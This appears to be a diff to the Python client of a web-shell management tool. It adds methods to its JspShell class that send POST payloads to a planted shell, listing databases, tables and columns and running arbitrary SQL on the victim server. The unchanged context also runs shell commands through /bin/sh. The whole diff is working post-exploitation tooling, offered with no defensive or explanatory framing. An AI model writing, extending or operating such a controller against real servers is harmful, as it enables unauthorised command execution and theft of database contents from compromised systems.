@@ -65,3 +65,25 @@ class JspShell:
         payload = {self.shellEntity.shell_password: 'M', 'z1': '-c/bin/sh','z2':z2, 'z0': self.shellEntity.shell_encode_type}
         response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
         return self.parseResponse(response)
+
+    def getDatabases(self,connectInfo):
+        payload = {self.shellEntity.shell_password: 'N', 'z1': connectInfo, 'z0': self.shellEntity.shell_encode_type}
+        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
+        return self.parseResponse(response)
+
+    def getTables(self,connectInfo,databaseName):
+        payload = {self.shellEntity.shell_password: 'N', 'z1': connectInfo+'\r\n'+databaseName, 'z0': self.shellEntity.shell_encode_type}
+        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
+        return self.parseResponse(response)
+
+    def getColumns(self,connectInfo,databaseName,tableName):
+        payload = {self.shellEntity.shell_password: 'N', 'z1': connectInfo + '\r\n' + databaseName+'\r\n'+tableName,
+                   'z0': self.shellEntity.shell_encode_type}
+        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
+        return self.parseResponse(response)
+
+    def excuteSqlQuery(self,connectInfo,databaseName,sqlStr):
+        payload = {self.shellEntity.shell_password: 'N', 'z1': connectInfo + '\r\n' + databaseName ,'z2':sqlStr,
+                   'z0': self.shellEntity.shell_encode_type}
+        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
+        return self.parseResponse(response)
